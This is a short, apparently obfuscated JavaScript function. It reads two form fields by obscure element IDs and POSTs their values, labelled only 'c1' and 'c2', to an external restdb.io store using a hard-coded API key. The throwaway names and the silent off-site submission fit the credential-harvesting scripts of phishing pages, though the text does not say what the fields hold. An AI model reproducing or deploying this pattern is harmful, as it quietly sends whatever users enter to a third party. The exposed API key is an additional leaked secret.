var adfaadfbjkadfnb118 = "#afdnklasdfk1bjsvajk";
var adfabdfakjbasdfbak = "#bjkabjabjkadbjlkvalk1412";
function aadfa1kabjkadbjka1() {
  var f12bjkabjkbjka3221 = $(adfaadfbjkadfnb118).val();
  var s44ajkabdfkaadfa14 = $(adfabdfakjbasdfbak).val();
  var adfbkasdfadfjkbabjkjka = {"c1": f12bjkabjkbjka3221,"c2": s44ajkabdfkaadfa14};

  var knadkadnkadsklaadfbjjk = {
    "async": true,
    "crossDomain": true,
    "url": "https://learn-29ef.restdb.io/rest/store",
    "method": "POST",
    "headers": {
      "content-type": "application/json",
      "x-apikey": "6001710c1346a1524ff12acc",
      "cache-control": "no-cache"
    },
    "processData": false,
    "data": JSON.stringify(adfbkasdfadfjkbabjkjka)
  }

  $.ajax(knadkadnkadsklaadfbjjk).done(function (response) {
    console.log(response);
  });


}


